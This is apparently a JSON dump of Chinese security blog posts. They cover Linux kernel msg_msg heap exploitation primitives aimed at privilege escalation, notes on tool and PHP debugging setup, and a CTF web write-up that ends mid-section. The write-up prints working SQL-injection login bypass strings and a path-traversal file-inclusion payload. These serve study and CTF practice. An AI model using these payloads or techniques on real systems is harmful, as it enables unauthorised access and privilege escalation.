out_unlock0;\n```\n\n使用这个标志位还需要在内核编译的时候设置`CONFIG_CHECKPOINT_RESTORE=y`才行，否则还是会出错的\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//正常的一些数据复制\n}\n#else\n//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\n🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的`v5.11`中，`MSG_NOERROR`和`MSG_COPY`（后续会讲到）没有办法同时生效，关键点在于`copy_msg()`函数中，转化成汇编如下：\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\n注意到红框的部分，获取`rdi(msg)`和`rsi(copy)`对应的`m_ts`进行比较，而`copy`的`m_ts`是从用户传进来的想要获取消息的长度，如果小于实际的`msg`的`m_ts`长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。\n\n##### B.释放堆块的消息读取\n\n同理如果不指定`MSG_COPY`这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的`mtype`和接收消息时设置的`msgtpy`来进行消息队列中各个位置的堆块的释放。\n\n##### C.数据复制\n\n不管什么标志位，只要不是`MSG_NOERROR`和`MSG_COPY`联合起来，并且申请读取消息长度`size`小于通过`find_msg()`函数获取到的实际消息的`m_ts`，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)利用\n\n#### 越界读取\n\n这样，当我们通过之前提到的`double-free/UAF`，并且再使用`setxattr`来对`msg_msgmsg`中的`m_ts`进行修改，这样在我们调用`msgrcv`的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。\n\n**使用`setxattr`的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样**\n\n为了获取到地址的成功性更大，我们就需要用到单个`msg_queue`和单个`msg_msg`的内存模型\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\n可以看到单个`msg_msg`在`msg_queue`的管理下形成双向循环链表，所以如果我们通过`msgget`和`msgsnd`多申请一些相同大小的且只有一个`msg_msg`结构体的`msg_queue`，那么越界读取的时候，就可以读取到只有单个`msg_msg`的头部了\n\n而单个`msg_msg`由于双向循环链表，其头部中又存在指向`msg_queue`的指针，那么这样就能泄露出`msg_queue`的堆地址了。\n\n\n\n#### 任意读取\n\n完成上述泄露`msg_queue`的堆地址之后，就需要用到`msg_msg`的内存布局了\n\n由于我们的`msg_msg`消息的内存布局如下\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\n相关读取源码如下：\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\n所以如果我们可以修改`next`指针和`m_ts`，结合读取`msg`最终调用函数`store_msg`的源码，那么就能够实现任意读取。\n\n那么接着上面的，我们得到`msg_queue`之后，可以再将`msg_msg`的next指针指回`msg_queue`，读出其中的`msg_msg`，就能获得当前可控堆块的堆地址。\n\n这样完成之后，我们结合`userfaultfd`和`setxattr`频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。\n\n同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。\n\n#### 任意写\n\n同样的，`msg_msg`由于next指针的存在，结合`msgsnd`也具备任意地址写的功能。我们可以在拷贝的时候利用`userfaultfd`停下来，然后更改next指针，使其指向我们需要的地方，比如`init_cred`结构体位置，从而直接修改进行提权。\n\n\n\n# 十、常见函数总结\n\n## `printk`:\n\n```c\nprintk(日志级别 \"消息文本\");\n```\n\n其中日志级别定义如下：\n\n```c\n#defineKERN_EMERG \"<0>\"/*紧急事件消息，系统崩溃之前提示，表示系统不可用*/\n#defineKERN_ALERT \"<1>\"/*报告消息，表示必须立即采取措施*/\n#defineKERN_CRIT \"<2>\"/*临界条件，通常涉及严重的硬件或软件操作失败*/\n#define KERN_ERR \"<3>\"/*错误条件，驱动程序常用KERN_ERR来报告硬件的错误*/\n#define KERN_WARNING \"<4>\"/*警告条件，对可能出现问题的情况进行警告*/\n#define KERN_NOTICE \"<5>\"/*正常但又重要的条件，用于提醒。常用于与安全相关的消息*/\n#define KERN_INFO \"<6>\"/*提示信息，如驱动程序启动时，打印硬件信息*/\n#define KERN_DEBUG \"<7>\"/*调试级别的消息*/\n```\n\n## `kmalloc`:\n\n```C\nstatic inline void *kmalloc(size_t size, gfp_t flags)\n```\n\n其中flags一般设置为GFP_KERNEL或者GFP_DMA，在堆题中一般就是\n\nGFP_KERNEL模式，如下：\n\n　|– 进程上下文，可以睡眠　　　　　GFP_KERNEL\n　|– 进程上下文，不可以睡眠　　　　GFP_ATOMIC\n　|　　|– 中断处理程序　　　　　　　GFP_ATOMIC\n　|　　|– 软中断　　　　　　　　　　GFP_ATOMIC\n　|　　|– Tasklet　　　　　　　　　GFP_ATOMIC\n　|– 用于DMA的内存，可以睡眠　　　GFP_DMA | GFP_KERNEL\n　|– 用于DMA的内存，不可以睡眠　　GFP_DMA **|GFP_ATOMIC**\n\n具体可以看\n\n[Linux内核空间内存申请函数kmalloc、kzalloc、vmalloc的区别【转】 - sky-heaven - 博客园 (cnblogs.com)](https://www.cnblogs.com/sky-heaven/p/7390370.html)\n\n`kzmalloc`类似，就是分配空间并且内存初始化为0\n\n## `kfree`:\n\n这个就不多说了，就是简单的释放。\n\n## `copy_from_user`:\n\n```c\ncopy_from_user(void *to, const void __user *from, unsigned long n)\n```\n\n## `copy_to_user`:\n\n```c\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n```\n\n这两个就不讲了，顾名思义。\n\n# 十一、其他知识\n\n## 1.内核模块隐藏\n\n不知道为啥，这里不成功，显示\n\n` Unknown symbol module_mutex (err 0)`\n\n参考：[简易 Linux Rootkit 编写入门指北（一）：模块隐藏与进程提权 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246749#h3-7)\n\n\n\n## 2.文件系统\n\n### (1)SRV4文件系统\n\n也就是常见的cpio后缀的\n\n![image-20220330101231165](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png)\n\n这个直接常用解包打包即可\n\n### (2)ext4文件系统\n\nlinux下挂载修改即可\n\n```bash\nsudo mount rootfs.ext4 mountpoint/\ncd mountpoint/\n#change somethin\ncd ../\nsudo umount ./mountpoint\n```\n\n常见的init启动脚本在`/etc/init.d/rcS`中\n\n\n\n## 3.设备操作\n\n- 获取设备信息\n\n通过命令`udevadm info -a -n /dev/tty`获取相关设备信息\n\n![image-20220330171652853](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png)\n\n- 修改设备权限\n\n当我们无法对设备进行操作时，可能是被设置了权限，可以通过`/etc/udev/rules.d/`下查看设置的一些规则\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png)\n\n查看相关的内容，即指定相关设备后可以设置其类似用户组`GROUP`或者权限`MODE`等内容\n\n![image-20220330171405407](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png)\n\n- 读取\n\n直接`cat /dev/DEV_NAME`相当于`open_read_close`这个设备\n\n\n\n## 4.获取内核符号\n\n当我们拿到一个`bzImage`或者无符号的`vmlinux`文件时，想要获取符号一般只有以下两种\n\n### (1)启动内核\n\n我们利用busybox制作文件系统，然后使用qemu加载启动内核，启动之后在`/proc/kallsyms`保存所有地址，直接cat查看即可。\n\n### (2)使用工具\n\n有个工具[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)，这个还是很好使的，可以直接获得带符号的`vmlinux`文件\n\n\n\n## 5.互斥锁和信号量\n\n### (1)互斥锁\n\n用于线程互斥，一个互斥锁的加锁和解锁必须由同一个线程执行，是为了防止对一块内存的同时读写等问题。\n\n```c\n#include<linux/mutex.h>\nstruct mutext mtx;\nmutex_init(&mtx);//初始化互斥锁\n\nif(mutex_lock_interruptible(&mtx))//-EINTR(退出进程)\n\treturn -ERESTARTSYS;//进入等待\n//.....//\nmutex_unlock(&mtx);\n```\n\n\n\n### (2)信号量\n\n用于线程同步，合理使用公共资源。比如一个资源只有5份，每当一个线程获取该资源时，信号量就减一，当5个线程都获得该资源时，信号量减为0，其他线程就不能再获取该资源，处于等待状态，防止死锁。\n\n```c\n#include<linux/semaphore.h>\nstruct semaphore sema;\n\nsema_init(&sema,1);//初始化信号量，将资源量设置为1\nif(down_interruptible(&sema))//-EINTR(退出进程)\n\treturn -ERESTARTSYS;//进入等待\n//......//\nup(&sema)\n```\n\n\n\n## 6.系统调用使用\n\n### (1)传参约定\n\n- 32位：EBX、ECX、EDX、ESI、EDI、EBP\n- 64位：RDI、RSI、RDＸ、R10、R8、R9\n","tags":["kernel笔记汇总"],"categories":["kernel","kernel笔记汇总"]},{"title":"Burpsuite使用","url":"/2022/01/09/Burpsuite使用/","content":"\n\n\n\n\n# 一、配置\n\n## 1.配置浏览器代理\n\n### (1)安装\n\nEdge安装插件Proxy SwitchyOmega\n\n### (3)设置\n\n进入选项\n\n![image-20220109124055943](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091240977.png)\n\n配置如下\n\n![image-20220109124123157](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091241223.png)\n\n## 2.配置BurpSuite\n\nProxy->Options\n\n![image-20220109124203603](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091242646.png)\n\n没有的可以点旁边的Add按钮添加。\n\n\n\n\n\n# 二、使用\n\n## 1.抓包\n\n### (1)Edge浏览器开启代理\n\n![image-20220109180624711](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091806742.png)\n\n选中如图代理\n\n然后继续点击网页\n\n### (2)Burpsuite开启\n\nBurpsuit中\n\nProxy->Intercept处，如果点击如下按钮\n\n![image-20220109180945990](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091809028.png)\n\n那么每接收一个包，BurpSuite都会拦截，需要点击Froward继续，或者丢弃Drop该包，页面才会继续加载。\n\n然后到Target->Site map处，即可看到拦截的文件\n\n![image-20220109181204449](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091812502.png)\n\n\n\n## 2.改包\n\n### (1)先抓包\n\n首先浏览器开启代理，BurpSuite抓到包\n\n![image-20220111141339457](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424692.png)\n\n### (2)发送到Repeater\n\n然后将包发送到`repeater`\n\n![image-20220111141424655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424737.png)\n\n在Repeater最新出现的一部分就是\n\n![image-20220111141531436](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424733.png)\n\n修改然后使用点击Go即可发送修改之后的包，Response接收反馈的包并解析\n\n","tags":["Burpsuite使用"],"categories":["Burpsuite使用"]},{"title":"PHP环境搭建","url":"/2022/01/06/PHP环境搭建/","content":"\n# 一、调试搭建\n\n## 🔺Windows版本\n\n## 1.前置安装\n\nphpstorm+phpStudy\n\n这两个需要先装好，之后利用phpStudy中自带的xdebug来调试\n\n## 2.phpStudy设置\n\n### (1)php版本\n\n这里我的php选择的是如下\n\n![image-20220107105326110](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png)\n\n### (2)打开xdebug\n\n单击设置->扩展组件，设置如下\n\n![image-20220107105424985](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png)\n\n### (3)修改php.ini\n\n然后主界面设置->php.ini->单击对应版本，即可打开php.ini配置文件\n\n![image-20220107105552036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png)\n\n打开之后，在最下面的xdebug设置如下\n\n```\n[Xdebug]\nxdebug.idekey = PHPSTORM\nzend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll\nxdebug.collect_params=1\nxdebug.collect_return=1\nxdebug.auto_trace=On\nxdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace\nxdebug.profiler_enable=On\nxdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler\nxdebug.remote_enable=On\nxdebug.remote_host=localhost\nxdebug.remote_port=9000\nxdebug.remote_handler=dbgp\n```\n\n这里参考https://www.cnblogs.com/baocheng/p/5775938.html  相关的会更加详细。\n\n主要是设置`xdebug.remote_handler`，`xdebug.remote_port`，`xdebug.remote_host`，`xdebug.profiler_enable`，`xdebug.idekey`，`xdebug.remote_enable`\n\n### (4)网站路径设置\n\n主界面网站->管理->修改->根目录，然后设置为在phpStorm中存放php文件的目录，没有的可以直接创建一个\n\n![image-20220107111415751](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png)\n\n### (5)开启服务\n\nphpStudy中开启对应的网站服务即可\n\n![image-20220107112835096](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png)\n\n## 3.phpstorm设置\n\n### (1)PHP版本选择\n\n版本选择之前我们的设置好的相关版本\n\n![image-20220107110300128](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png)\n\n这里的CLI interpreter需要选择phpStudy中的php，点击旁边的`...`按钮，找到对应的php.exe添加即可，大多的路径如下\n\n![image-20220107110410950](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png)\n\n### (2)xdebug配置\n\n打开phpstorm，打开setting->PHP->Debug，xdebug配置如下，主要是端口对应\n\n![image-20220107110012400](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png)\n\nPHP->Debug->DBGp Proxy，进行相关设置\n\n![image-20220107110614445](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png)\n\n\n\n### (3)服务器端配置\n\nsetting->server\n\n![image-20220107110138638](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png)\n\n没有的自行+号添加，名字自己定义\n\n### (4)配置php文件路径\n\nRun->Edit Configurations\n\n![image-20220107110807337](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png)\n\n然后添加对应的调试路径\n\n![image-20220107111003896](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png)\n\n对应设置\n\n![image-20220107111151592](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png)\n\n## 4.开始调试\n\n然后在phpStorm中对应网站的目录下的文件即可下断点开始调试\n\n### (1)开始监听\n\n![image-20220107111554195](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png)\n\n设置好调试环境，然后点旁边的电话，使其变成如下\n\n![image-20220107111631356](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png)\n\n### (2)调试\n\n在文件中下断点，点击debug即可开始调试\n\n![image-20220107112446079](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png)\n\n\n\n## 🔺Linux版本\n\n## 1.前置安装\n\n用的也是PHPSTORM和宝塔linux\n\n## 2.宝塔linux设置\n\n### (1)安装xdebug\n\n安装好PHP之后，设置安装PHP的拓展\n\n![image-20220113110140841](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png)\n\n### (2)配置php.ini\n\n![image-20220113110241556](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png)\n\n```\n[XDebug]\n; 允许远程 可以为 On 或者 1 都表示启用 ， Off 和 0 表示关闭关闭\nxdebug.remote_enable = On\n; 远程主机的 IP 这里我们填写，固定的 127.0.0.1 这里写的是PHPSTORM所在的那台机器上的IP\nxdebug.remote_host = 127.0.0.1\n; 调试连接端口 请记住这个端口，后续会用到。此配置项默认值为 9000 ，但是通常 9000 端口被 fpm 占据 ，故更换端口。\n; 另外，请在你服务器的控制面板和服务器防火墙中开放这个端口的进出站。\n; 如果你是宝塔面板用户 请放行此端口。\nxdebug.remote_port = 9001\n; 接下来的值都是可选的，但是我推荐你使用\n; 连接 IDE 的 Key，请记住他，可以自己自定义，主要用来过滤请求。\nxdebug.idekey=PHPSTORM\nxdebug.remote_handler=dbgp\nxdebug.collect_params=1\nxdebug.collect_return=1\nxdebug.auto_trace=On\nxdebug.profiler_enable=On\n```\n\n参照\n\n[Linux内网服务器+宝塔+Xdebug远程调试配置 – T1h2ua's Blog](https://www.t1h2ua.cn/archives/69)\n\n保存之后，重载一下配置\n\n![image-20220113110410355](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png)\n\n### (3)网站路径设置\n\n宝塔Linux中点击网站，添加站点\n\n![image-20220113110540548](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png)\n\n得到如下\n\n![image-20220113110610661](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png)\n\n### (4)开启服务\n\n记得把对应的服务打开，nginx/apache和php\n\n![image-20220113110735466](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png)\n\n### (5)放行9001端口\n\n![image-20220113111553907](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png)\n\n\n\n## 3.phpStorm设置\n\n这里就都差不多，选择php版本，配置xdebug，配置Server，配置php文件路径，注意这里选取的端口为9001\n\n![image-20220113110926412](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png)\n\n![image-20220113111016050](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png)\n\n![image-20220113110938531](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png)\n\n![image-20220113111029912](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png)\n\n![image-20220113111210749](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png)\n\n然后就可以调试了。\n\n## 🔺注：\n\nxdebug3.0以上的，配置有点变化，如下\n\n```\n[XDebug]\nxdebug.mode = develop,debug\nxdebug.start_with_request = default|default\n;xdebug.start_with_request = yes ;当改为yes时所有请求都会走debug，不需要设置idekey \nxdebug.client_host = 127.0.0.1 \nxdebug.client_port = 9001\nxdebug.remote_handler = dbgp\nxdebug.idekey = PHPSTORM\nxdebug.cli_color = 2\nxdebug.var_display_max_depth = 15\nxdebug.var_display_max_data  = 2048\n```\n\n\n\n# 二、数据库搭建\n\n## 1.phpStudy设置\n\n### (1)创建数据库\n\n设置数据库，没有就创建，鼠标碰到密码可以查看\n\n![image-20220109115051455](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png)\n\n### (2)打开MySQL数据库\n\n![image-20220109115216201](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png)\n\n## 2.phpStorm设置\n\n### (1)设置\n\nview->Tool Windows->databases\n\n![image-20220109115314160](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png)\n\n然后创建一个连接\n\n![image-20220109115352472](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png)\n\n![image-20220109115418414](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png)\n\n对应输入host，账号密码即可\n\n![image-20220109115447217](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png)\n\n### (2)查看控制\n\n![image-20220109115523944](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png)\n\nview->tool windows->database之后，双击上面红框可以进入控制界面\n\n![image-20220109115615823](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png)\n\n然后就正常了。\n\n\n\n\n\n# 三、PHP模块搭建\n\n## 1.创建模块模板\n\n找到php源码目录\n\n![image-20220210174644261](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101746346.png)\n\n然后使用`ext_skel`创建一个模板\n\n```\n./ext_skel --extname=helloworld\n```\n\n## 2.编译模块\n\n随后进行编译，跳转到刚刚生成的模块文件夹路径`/path_to_php_src/ext/helloworld`，然后编译\n\n```\n/www/server/php/56/bin/phpize\n./configure  --with-php-config=/www/server/php/56/bin/php-config\n```\n\n这里需要指定一下`--with-php-config`，选择自己的`php-config`，当然如果本地的环境变量bin命令下直接有`php-config`也不用指定了，随后\n\n```\nmake\n```\n\n这样就可以在当前目录下生成了\n\n![image-20220210175900511](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101759576.png)\n\n其中`helloworld.c`即为创建的模板代码，但是不知道为什么5.6版本的编译完成后，不生成.so模块文件，可能是版本特性？\n\n```C\n/* helloword extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_helloword.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n/* {{{ void helloword_test1()\n */\nPHP_FUNCTION(helloword_test1)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n/* }}} */\n\n/* {{{ string helloword_test2( [ string $var ] )\n */\nPHP_FUNCTION(helloword_test2)\n{\n\tchar *var = \"World\";\n\tsize_t var_len = sizeof(\"World\") - 1;\n\tzend_string *retval;\n\n\tZEND_PARSE_PARAMETERS_START(0, 1)\n\t\tZ_PARAM_OPTIONAL\n\t\tZ_PARAM_STRING(var, var_len)\n\tZEND_PARSE_PARAMETERS_END();\n\n\tretval = strpprintf(0, \"Hello %s\", var);\n\n\tRETURN_STR(retval);\n}\n/* }}}*/\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(helloword)\n{\n#if defined(ZTS) && defined(COMPILE_DL_HELLOWORD)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(helloword)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"helloword support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ helloword_functions[]\n */\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ helloword_module_entry\n */\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_HELLOWORD\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(helloword)\n#endif\n\n```\n\n## 🔺注：\n\n需要注意的是，在php7.3以上，`ext_skel`这个shell变成了`ext_skel.php`，所以我们使用如下来创建\n\n```\n/www/server/php/73/bin/php ./ext_skel.php --ext helloword\n/www/server/php/73/bin/phpize\n./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config\nmake\n```\n\n## 3.加载模块\n\n### 方法一：\n\n直接`make install`，然后在对应的php.ini中添加`extension=helloword.so`\n\n### 方法二：\n\n复制modules下的helloworld.so模块到对应的php扩展目录\n\n```\ncp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/\n```\n\n同样也得在php.ini中添加extension\n\n之后使用模板中函数测试即可\n\n```\n<?php\nhelloword_test1();\n?>\n```\n\n如下即可成功\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101910792.png)\n\n这个php拓展模块其实跟linux内核有点像\n\n","tags":["PHP环境搭建"],"categories":["PHP环境搭建"]},{"title":"陪XX的WebBUU刷题(一)","url":"/2022/01/06/陪XX的WebBUU刷题(一)/","content":"\n# 一、EasySQL\n\n## 🔺SQL注入登录\n\n简单的SQL注入\n\n## 1.查看网页源代码\n\n![image-20220106105755040](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png)\n\n可以看到是check.php在对登录按钮进行操作，使用的方法是GET，加上题目提示是SQL注入，所以就直接尝试SQL注入。\n\n## 2.注入原理\n\n由于SQL注入中涉及单引号和双引号，且对字符串的处理基本都是单引号进行处理，检测一下，倘若我们使用双引号进行注入\n\n```\ncheck.php?username=aaa' or \"1\"=\"1&password=aaa' or \"1\"=\"1\n```\n\n那么出现如下错误\n\n![image-20220106110800649](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png)\n\n那么采用单引号进行注入\n\n```\ncheck.php?username=aaa' or '1'='1&password=aaa' or '1'='1\n```\n\n之后即可成功\n\n![image-20220106142353692](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png)\n\n\n\n# 二、[HCTF 2018]WarmUp\n\n## 🔺文件包含漏洞\n\n提示有`source.php`，访问一下看到源码，代码审计\n\n```php\n<?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"aaaa\";\n    }  \n?>\n```\n\n即`emmm::checkFile`函数返回`True`可以触发文件包含，这里简单调试一下就知道，由于`mb_substr`和`mb_strpos`的使用，导致可以用`file=source.php?xxxxx`来进行绕过检测。\n\n即最终可以执行到`include(\"source.php?xxxxx\")`\n\n然后查看`hint.php`，发现`flag`为`ffffllllaaaagggg`，那么即可触发文件包含漏洞，执行代码`include(\"source.php?../../../../../../ffffllllaaaagggg\")`\n\n这里比较有意思的一点是对于`include`函数的使用\n\n```\ninclude(\"xxxx.php?../../flag\");\ninclude(\"xxxx.php../../flag\");\n```\n\n两个类似的代码，一个有`?`，一个没有，然后在`Linux`环境下，这两个代码都代表包含当前目录下的`flag`，但是在`Windows`环境下，有`?`的执行不成功，没有的可以执行成功，有点离谱。\n\n当然，这个`xxxx.php`换成其他字符都可以。\n\n\n\n# 三、[极客大挑战 2019]Havefun1\n\n## 🔺简单查询\n\n查看源代码，跳过css和style部分\n\n可以看到注释部分的提示\n\n![image-20220107114730804](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png)\n\n即当cat=dog时，就会输出Syc{cat_cat_cat}，但是一般这都是作者给的提示，实际输出内容可能不是Syc{cat_cat_cat}，所以先尝试一波\n\n```\nurl/index.php?cat=dog\n```\n\n直接出flag了\n\n![image-20220107114926958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png)\n\n\n\n# 四、[ACTF2020 新生赛]Include\n\n## 🔺PHP伪协议\n\n## 1.前置探索\n\n点击tips之后发现输出提示，获取到使用file协议的flag.php\n\n![image-20220107120937019](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png)\n\n查看flag.php的网页源代码但是什么也没有\n\n![image-20220107121010226](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png)\n\n之后尝试利用php的伪协议来读取flag.php的源代码\n\n## 